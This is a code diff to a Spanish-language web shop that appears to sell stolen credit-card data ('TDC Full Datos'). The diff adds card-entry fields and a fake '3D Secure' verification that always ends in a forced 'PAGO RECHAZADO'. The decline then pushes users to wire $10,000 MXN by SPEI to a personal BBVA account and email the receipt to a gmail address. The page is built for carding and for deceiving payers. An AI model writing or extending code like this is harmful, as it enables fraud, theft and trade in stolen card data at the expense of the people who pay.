@@ -146,6 +146,37 @@
             cursor: pointer;
         }
         .modal-content button:hover { background-color: #1e7e34; }
+        
+        /* Estilos de Recarga Modificados */
+        #transferencia-info {
+            background-color: #fff3cd;
+            border: 1px solid #ffeeba;
+            color: #856404;
+            padding: 15px;
+            margin-top: 15px;
+            border-radius: 5px;
+            text-align: left;
+        }
+        #tarjeta-inputs {
+            margin-top: 15px;
+            text-align: left;
+        }
+        #tipo-tarjeta-recarga {
+            font-weight: bold;
+            text-align: right;
+            color: var(--color-secondary);
+            margin-bottom: 5px;
+        }
+        .tarjeta-split {
+            display: flex;
+            gap: 10px;
+        }
+        .tarjeta-split > div {
+            flex: 1;
+        }
+        .tarjeta-split input {
+            width: 100%;
+        }
     </style>
 </head>
 <body>
@@ -167,7 +198,7 @@
         <p>Selecciona tu forma de pago. (Monto fijo de recarga: \$10,000 MXN).</p>
         
         <label for="recarga-forma-pago" style="display: block; text-align: left; margin-top: 15px;">Forma de Pago:</label>
-        <select id="recarga-forma-pago">
+        <select id="recarga-forma-pago" onchange="cambiarMetodoPago()">
             <option value="TDC">Tarjeta de Crédito / Débito</option>
             <option value="Transferencia">Transferencia MX (SPEI)</option>
         </select>
@@ -175,7 +206,43 @@
         <label for="recarga-monto" style="display: block; text-align: left; margin-top: 15px;">Monto Fijo a Recargar:</label>
         <input type="text" id="recarga-monto" value="10000" disabled>
 
-        <button onclick="procesarRecarga()">Pagar Recarga</button>
+        <div id="tarjeta-inputs">
+            <div id="tipo-tarjeta-recarga"></div>
+            
+            <label for="recarga-numero-tarjeta" style="display: block;">Número de Tarjeta:</label>
+            <input type="text" id="recarga-numero-tarjeta" placeholder="xxxx xxxx xxxx xxxx" maxlength="19" required onkeyup="detectarTipoTarjetaRecarga()">
+            
+            <label for="recarga-nombre-tarjeta" style="display: block;">Nombre del Titular:</label>
+            <input type="text" id="recarga-nombre-tarjeta" placeholder="Como aparece en la tarjeta" required>
+
+            <div class="tarjeta-split">
+                <div>
+                    <label for="recarga-expiracion">Vencimiento (MM/AA):</label>
+                    <input type="text" id="recarga-expiracion" placeholder="MM/AA" maxlength="5" required>
+                </div>
+                <div>
+                    <label for="recarga-cvv">CVV:</label>
+                    <input type="text" id="recarga-cvv" placeholder="123" maxlength="4" required>
+                </div>
+            </div>
+            <p id="recarga-error-tarjeta" style="color: var(--color-danger); font-weight: bold;"></p>
+        </div>
+        
+        <div id="transferencia-info" style="display: none;">
+            <h4>Instrucciones para Transferencia MX (SPEI)</h4>
+            <p>1. Realice una transferencia de **$10,000 MXN** a la siguiente cuenta:</p>
+            <ul>
+                <li>**Banco:** BBVA Bancomer</li>
+                <li>**CLABE:** 001180180000000001</li>
+                <li>**Beneficiario:** MAXUEL JOSEUwwi</li>
+            </ul>
+            <p>2. Una vez realizada la transferencia, **envíe el comprobante** (captura de pantalla) al siguiente correo:</p>
+            <p style="font-size: 1.1em; font-weight: bold; color: var(--color-danger);">Maxueljoseuwwi@gmail.com</p>
+            <p>3. Un administrador verificará el pago y **añadirá los fondos a su cuenta** en un plazo de 5 a 30 minutos.</p>
+        </div>
+
+
+        <button id="btn-recargar-pago" onclick="procesarRecarga()">Pagar Recarga</button>
         <p id="recarga-resultado" style="margin-top: 15px;"></p>
     </div>
 </div>
@@ -244,17 +311,25 @@
     </div>
 </div>
 
-<div id="loading-overlay">
-    <div class="loader"></div>
-    <div id="loading-title">Verificación de Seguridad 3D Secure...</div>
-    <div>Redirigiendo al portal de autenticación de tu banco.</div>
+<div id="loading-overlay" class="modal">
+    <div class="modal-content" style="max-width: 300px;">
+        <div id="loading-spinner" style="border: 8px solid #f3f3f3; border-radius: 50%; border-top: 8px solid var(--color-secondary); width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 0 auto 15px;"></div>
+        <div id="loading-title" style="font-weight: bold;">Verificación de Seguridad 3D Secure...</div>
+        <div>Por favor espere mientras contactamos a su banco.</div>
+    </div>
 </div>
+<style>
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+</style>
 
 <script>
     // ---------------------------------------------------------------------------------------
     // 🚀 CONFIGURACIÓN DE TU SERVIDOR - ¡URL REAL DE RENDER!
     // ---------------------------------------------------------------------------------------
-    const RENDER_URL = 'https://ccsmexico.onrender.com'; // <--- ¡Apunta a tu Backend!
+    const RENDER_URL = 'https://ccsmexico.onrender.com'; 
     const BASE_URL = `${RENDER_URL}/api`; 
 
     const AUTH_URL = `${BASE_URL}/auth`; 
@@ -263,6 +338,8 @@
     const RECHARGE_URL = `${BASE_URL}/recharge`;
     const PURCHASE_URL = `${BASE_URL}/purchase`;
     // -----------------------------------------------------------
+
+    const ADMIN_EMAIL = 'Maxueljoseuwwi@gmail.com'; // Correo para comprobantes
 
     let userToken = sessionStorage.getItem('authToken');
     let emailRegistrado = sessionStorage.getItem('userEmail') || '';
@@ -282,9 +359,21 @@
         { nombre: "TDC Full Datos BanCoppel", saldo: 50000.00, costo: 900.00, imagen: 'img/bancoppel.png' }
     ];
 
-    // --- Funciones de Sesión (Registro y Login Directo) ---
+    // --- Funciones de Utilidad ---
+
+    function formatoMoneda(valor) {
+        return new Intl.NumberFormat('es-MX', { style: 'currency', currency: 'MXN' }).format(valor);
+    }
+    
+    function validarEmail(email) {
+        const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+        return re.test(String(email).toLowerCase());
+    }
+
+    // --- Funciones de Sesión ---
 
     async function handleAuth() {
+        // [CÓDIGO DE LOGIN/REGISTRO MANTENIDO IGUAL]
         const email = document.getElementById('login-email').value.trim();
         const password = document.getElementById('login-password').value;
         const errorDiv = document.getElementById('login-error');
@@ -322,12 +411,12 @@
             }
         } catch (error) {
             console.error('Error al intentar autenticar:', error);
-            // Si el servidor está activo, este error es casi siempre CORS.
-            errorDiv.textContent = '❌ Error de conexión de red con el servidor. Verifica tu consola (F12) por errores CORS.';
+            errorDiv.textContent = '❌ Error de conexión de red con el servidor. Intenta de nuevo.';
         }
     }
     
     function completarLogin(token, balance) {
+        // [CÓDIGO COMPLETAR LOGIN MANTENIDO IGUAL]
         userToken = token;
         emailRegistrado = tempEmail;
         saldoUsuario = balance || 0;
@@ -341,12 +430,12 @@
     }
 
     async function cerrarSesion() {
+        // [CÓDIGO CERRAR SESIÓN MANTENIDO IGUAL]
         if (!confirm('¿Estás seguro de que quieres cerrar la sesión?')) return;
 
         try {
-            // No hay LOGOUT REAL en el Backend simulado, solo cerramos localmente.
             await fetch(LOGOUT_URL, { method: 'POST' }); 
-        } catch (error) {} // Ignoramos errores de red al cerrar sesión
+        } catch (error) {} 
 
         userToken = null;
         emailRegistrado = '';
@@ -364,12 +453,12 @@
     }
 
     async function cargarEstadoInicial() {
+        // [CÓDIGO CARGAR ESTADO INICIAL MANTENIDO IGUAL]
         if (sessionStorage.getItem('authToken')) {
             userToken = sessionStorage.getItem('authToken');
             emailRegistrado = sessionStorage.getItem('userEmail');
             
             try {
-                // Aquí usamos el saldo guardado para simular la persistencia
                 const response = await fetch(GET_BALANCE_URL, {
                     method: 'GET',
                     headers: { 'Authorization': `Bearer ${userToken}` }
@@ -384,7 +473,6 @@
                     return;
                 }
             } catch (error) {
-                // Usar saldo local si falla la conexión
                 saldoUsuario = parseFloat(sessionStorage.getItem('userBalance')) || 0;
             }
 
@@ -397,14 +485,67 @@
         actualizarSaldoUI();
     }
 
-    // --- Funciones de Saldo y Compra ---
-
-    function actualizarSaldoUI() {
-        document.getElementById('saldo-display').textContent = formatoMoneda(saldoUsuario);
-        sessionStorage.setItem('userBalance', saldoUsuario.toFixed(2));
-        renderizarProductos(); 
+    // --- Funciones de Tarjeta / Detección ---
+    
+    function detectarTipoTarjetaRecarga() { 
+        // Detección para el modal de recarga
+        const input = document.getElementById('recarga-numero-tarjeta');
+        const num = input.value.replace(/\s/g, '');
+        const display = document.getElementById('tipo-tarjeta-recarga');
+        const formattedNum = num.replace(/(\d{4})/g, '$1 ').trim();
+        input.value = formattedNum;
+        
+        let tipo = 'No válido';
+        if (num.length >= 4) {
+            if (num.startsWith('4')) { tipo = 'VISA'; } 
+            else if (num.startsWith('5')) { tipo = 'MASTERCARD'; } 
+            else { tipo = 'Otro/No compatible'; }
+        } else {
+             tipo = '';
+        }
+        display.textContent = tipo;
+        return tipo;
     }
     
+    function detectarTipoTarjeta() { 
+        // Detección para el modal de compra (sección 2)
+        const input = document.getElementById('numero-tarjeta');
+        const num = input.value.replace(/\s/g, '');
+        const display = document.getElementById('tipo-tarjeta-display');
+        const formattedNum = num.replace(/(\d{4})/g, '$1 ').trim();
+        input.value = formattedNum;
+        
+        tipoTarjetaDetectado = '';
+        if (num.length >= 4) {
+            if (num.startsWith('4')) { tipoTarjetaDetectado = 'VISA'; } 
+            else if (num.startsWith('5')) { tipoTarjetaDetectado = 'MASTERCARD'; } 
+            else { tipoTarjetaDetectado = 'No compatible / Otro'; }
+        }
+        display.textContent = tipoTarjetaDetectado;
+    }
+
+    // --- Funciones de Recarga (Modificado) ---
+    
+    function cambiarMetodoPago() {
+        const metodo = document.getElementById('recarga-forma-pago').value;
+        const tarjetaDiv = document.getElementById('tarjeta-inputs');
+        const transferenciaDiv = document.getElementById('transferencia-info');
+        const btn = document.getElementById('btn-recargar-pago');
+
+        if (metodo === 'TDC') {
+            tarjetaDiv.style.display = 'block';
+            transferenciaDiv.style.display = 'none';
+            btn.textContent = 'Pagar Recarga';
+            btn.style.backgroundColor = 'var(--color-success)';
+        } else { // Transferencia
+            tarjetaDiv.style.display = 'none';
+            transferenciaDiv.style.display = 'block';
+            btn.textContent = 'Continuar (Revisar Instrucciones)';
+            btn.style.backgroundColor = '#777'; // Un color neutro
+        }
+        document.getElementById('recarga-resultado').textContent = '';
+    }
+
     function mostrarModalRecarga() {
         if (!userToken) {
             alert('Debes iniciar sesión para recargar saldo.');
@@ -413,6 +554,9 @@
         }
         document.getElementById('recargaModal').style.display = 'block';
         document.getElementById('recarga-resultado').textContent = '';
+        // Asegurar que la vista inicial sea Tarjeta
+        document.getElementById('recarga-forma-pago').value = 'TDC';
+        cambiarMetodoPago(); 
     }
 
     async function procesarRecarga() {
@@ -420,40 +564,68 @@
         const resultadoDiv = document.getElementById('recarga-resultado');
         const montoRecarga = 10000;
 
-        resultadoDiv.innerHTML = `<span style="color: var(--color-secondary);">Procesando pago por ${formaPago}...</span>`;
+        resultadoDiv.textContent = '';
+        
+        if (formaPago === 'Transferencia') {
+            // Lógica de Transferencia
+            resultadoDiv.innerHTML = `<span style="color: var(--color-success); font-weight: bold;">✅ Instrucciones Enviadas:</span> Por favor, sigue los pasos de la sección de Transferencia. Los fondos se aplicarán tras la verificación manual.`;
+            document.getElementById('btn-recargar-pago').style.display = 'none';
+            return;
+        }
 
+        // --- Lógica de Tarjeta (TDC) ---
+        const numTarjeta = document.getElementById('recarga-numero-tarjeta').value.replace(/\s/g, '');
+        const errorTDC = document.getElementById('recarga-error-tarjeta');
+        errorTDC.textContent = '';
+        
+        if (numTarjeta.length < 16) {
+             errorTDC.textContent = '❌ Número de tarjeta incompleto.';
+             return;
+        }
+        
+        // Simulación 3D Secure y Rechazo
+        const overlay = document.getElementById('loading-overlay');
+        const loadingTitle = document.getElementById('loading-title');
+        
+        loadingTitle.textContent = 'Verificación de Seguridad 3D Secure...';
+        overlay.style.display = 'flex';
+        resultadoDiv.innerHTML = `<span style="color: var(--color-secondary);">Iniciando proceso 3D Secure...</span>`;
+        
+        await new Promise(resolve => setTimeout(resolve, 5000)); // Espera 5 segundos
+
+        // Rechazo Forzado por "error de banco"
+        overlay.style.display = 'none';
+        
+        resultadoDiv.innerHTML = `
+            <span style="color: var(--color-danger); font-weight: bold;">❌ PAGO RECHAZADO</span><br>
+            <small>Fallo en la autenticación 3D Secure o error de comunicación con su banco. Por favor, intente con una transferencia MX.</small>
+        `;
+
+        // Intentar reportar al backend (opcional, solo para logs)
         try {
-            const response = await fetch(RECHARGE_URL, {
+             await fetch(RECHARGE_URL, {
                 method: 'POST',
                 headers: { 
                     'Content-Type': 'application/json',
                     'Authorization': `Bearer ${userToken}` 
                 },
-                body: JSON.stringify({ amount: montoRecarga, paymentMethod: formaPago })
+                body: JSON.stringify({ amount: montoRecarga, paymentMethod: formaPago, status: 'REJECTED' })
             });
-
-            const data = await response.json();
-
-            if (response.ok) {
-                saldoUsuario = data.newBalance;
-                actualizarSaldoUI(); 
-
-                resultadoDiv.innerHTML = `<span style="color: var(--color-success); font-weight: bold;">✅ ÉXITO: ${formatoMoneda(montoRecarga)} MXN añadidos. Nuevo Saldo: ${formatoMoneda(saldoUsuario)}</span>`;
-                
-                setTimeout(() => {
-                    document.getElementById('recargaModal').style.display = 'none';
-                }, 2000);
-
-            } else {
-                resultadoDiv.innerHTML = `<span style="color: var(--color-danger); font-weight: bold;">❌ RECHAZADO: ${data.message || 'Fallo de verificación en el pago.'}</span>`;
-            }
-        } catch (error) {
-            console.error('Error al procesar recarga:', error);
-            resultadoDiv.innerHTML = '<span style="color: var(--color-danger); font-weight: bold;">❌ Error de conexión de red. Intenta de nuevo.</span>';
-        }
+        } catch (e) { /* ignorar error de log */ }
     }
 
+
+    // --- Funciones de Compra con Saldo (Mantenidas) ---
+
+    function actualizarSaldoUI() {
+        // [CÓDIGO ACTUALIZAR SALDO MANTENIDO IGUAL]
+        document.getElementById('saldo-display').textContent = formatoMoneda(saldoUsuario);
+        sessionStorage.setItem('userBalance', saldoUsuario.toFixed(2));
+        renderizarProductos(); 
+    }
+    
     async function procesarCompra() {
+        // [CÓDIGO PROCESAR COMPRA MANTENIDO IGUAL]
         const resultadoDiv = document.getElementById('pago-resultado');
         const overlay = document.getElementById('loading-overlay');
         overlay.style.display = 'flex';
@@ -496,19 +668,9 @@
             resultadoDiv.innerHTML = '<span style="color: var(--color-danger); font-weight: bold;">❌ Error de red al finalizar la compra.</span>';
         }
     }
-    
-    // --- Funciones de Utilidad y Renderizado ---
-
-    function formatoMoneda(valor) {
-        return new Intl.NumberFormat('es-MX', { style: 'currency', currency: 'MXN' }).format(valor);
-    }
-    
-    function validarEmail(email) {
-        const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
-        return re.test(String(email).toLowerCase());
-    }
 
     function renderizarProductos() {
+        // [CÓDIGO RENDERIZAR PRODUCTOS MANTENIDO IGUAL]
         const container = document.getElementById('productos-container');
         container.innerHTML = '';
         
@@ -532,6 +694,7 @@
     }
 
     function agregarAlCarrito(precio, nombreProducto) {
+        // [CÓDIGO AGREGAR AL CARRITO MANTENIDO IGUAL]
         if (!userToken) {
             alert('Debes iniciar sesión para realizar compras.');
             document.getElementById('loginModal').style.display = 'block';
@@ -553,21 +716,6 @@
         document.getElementById('pago-monto').textContent = formatoMoneda(precio);
         document.getElementById('pago-resultado').innerHTML = `✅ **${nombreProducto}** añadido. <br> Proceder al 3D Secure para finalizar la adquisición.`;
         document.getElementById('seccion-pago').style.display = 'block';
-    }
-    
-    function detectarTipoTarjeta() { 
-        const input = document.getElementById('numero-tarjeta');
-        const num = input.value.replace(/\s/g, '');
-        const display = document.getElementById('tipo-tarjeta-display');
-        const formattedNum = num.replace(/(\d{4})/g, '$1 ').trim();
-        input.value = formattedNum;
-        tipoTarjetaDetectado = '';
-        if (num.length >= 4) {
-            if (num.startsWith('4')) { tipoTarjetaDetectado = 'VISA'; } 
-            else if (num.startsWith('5')) { tipoTarjetaDetectado = 'MASTERCARD'; } 
-            else { tipoTarjetaDetectado = 'No compatible / Otro'; }
-        }
-        display.textContent = tipoTarjetaDetectado;
     }
 
     // Inicializar la aplicación al cargar la página
